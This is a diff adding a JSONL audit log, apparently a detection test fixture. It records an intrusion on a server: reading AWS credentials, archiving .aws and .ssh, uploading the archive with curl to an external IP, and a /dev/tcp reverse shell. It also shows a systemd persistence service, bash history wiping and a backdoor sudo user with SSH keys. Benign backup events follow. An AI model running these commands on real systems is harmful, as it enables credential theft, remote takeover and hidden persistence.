@@ -1,0 +1,14 @@
+{"seq":1,"epoch":1780000001,"ts":"2026-09-25T21:00:01Z","pid":900,"ppid":800,"uid":0,"kind":"exec","exe":"/usr/sbin/sshd","cmdline":"sshd: pi@pts/0","target":"","success":true,"host":"prod-web01"}
+{"seq":2,"epoch":1780000005,"ts":"2026-09-25T21:00:05Z","pid":1000,"ppid":900,"uid":1000,"kind":"exec","exe":"/bin/bash","cmdline":"bash","target":"","success":true,"host":"prod-web01"}
+{"seq":3,"epoch":1780000012,"ts":"2026-09-25T21:00:12Z","pid":1000,"ppid":900,"uid":1000,"kind":"file","exe":"/bin/cat","cmdline":"cat /home/pi/.aws/credentials","target":"/home/pi/.aws/credentials","success":true}
+{"seq":4,"epoch":1780000020,"ts":"2026-09-25T21:00:20Z","pid":1000,"ppid":900,"uid":1000,"kind":"exec","exe":"/usr/bin/tar","cmdline":"tar -czf /tmp/.sysupdate.tar.gz .aws .ssh/","target":"/tmp/.sysupdate.tar.gz","success":true}
+{"seq":5,"epoch":1780000024,"ts":"2026-09-25T21:00:24Z","pid":1000,"ppid":900,"uid":1000,"kind":"file","exe":"/usr/bin/tar","cmdline":"tar -czf /tmp/.sysupdate.tar.gz .aws .ssh/","target":"/tmp/.sysupdate.tar.gz","success":true}
+{"seq":6,"epoch":1780000030,"ts":"2026-09-25T21:00:30Z","pid":1010,"ppid":1000,"uid":1000,"kind":"exec","exe":"/usr/bin/curl","cmdline":"curl -T /tmp/.sysupdate.tar.xyz","target":"","success":true}
+{"seq":7,"epoch":1780000031,"ts":"2026-09-25T21:00:31Z","pid":1010,"ppid":1000,"uid":1000,"kind":"net-connect","exe":"/usr/bin/curl","cmdline":"curl -T /tmp/.sysupdate.tar.gz","target":"185.199.108.153:443","success":true}
+{"seq":8,"epoch":1780000040,"ts":"2026-09-25T21:00:40Z","pid":1000,"ppid":900,"uid":1000,"kind":"exec","exe":"/bin/sh","cmdline":"bash -i >& /dev/tcp/185.199.108.153/4444 0>&1","target":"","success":true}
+{"seq":9,"epoch":1780000055,"ts":"2026-09-25T21:00:55Z","pid":1020,"ppid":1000,"uid":1000,"kind":"exec","exe":"/usr/bin/sudo","cmdline":"sudo systemctl enable sysupdate","target":"","success":true}
+{"seq":10,"epoch":1780000060,"ts":"2026-09-25T21:01:00Z","pid":1000,"ppid":900,"uid":1000,"kind":"file","exe":"/bin/sh","cmdline":"echo -n > /home/pi/.bash_history","target":"/home/pi/.bash_history","success":true}
+{"seq":11,"epoch":1780000075,"ts":"2026-09-25T21:01:15Z","pid":1030,"ppid":900,"uid":1000,"kind":"user-add","exe":"/usr/sbin/useradd","cmdline":"useradd -m svcbackup -G sudo","target":"svcbackup","success":true}
+{"seq":12,"epoch":1780000080,"ts":"2026-09-25T21:01:20Z","pid":1030,"ppid":900,"uid":1000,"kind":"file","exe":"/bin/sh","cmdline":"sh -c 'echo key > /home/svcbackup/.ssh/authorized_keys'","target":"/home/svcbackup/.ssh/authorized_keys","success":true}
+{"seq":13,"epoch":1780000200,"ts":"2026-09-25T21:03:20Z","pid":1100,"ppid":1,"uid":0,"kind":"exec","exe":"/usr/bin/backup","cmdline":"/usr/bin/backup --nightly","target":"","success":true}
+{"seq":14,"epoch":1780000210,"ts":"2026-09-25T21:03:30Z","pid":1100,"ppid":1,"uid":0,"kind":"net-connect","exe":"/usr/bin/backup","cmdline":"/usr/bin/backup --nightly","target":"backup.internal:873","success":true}
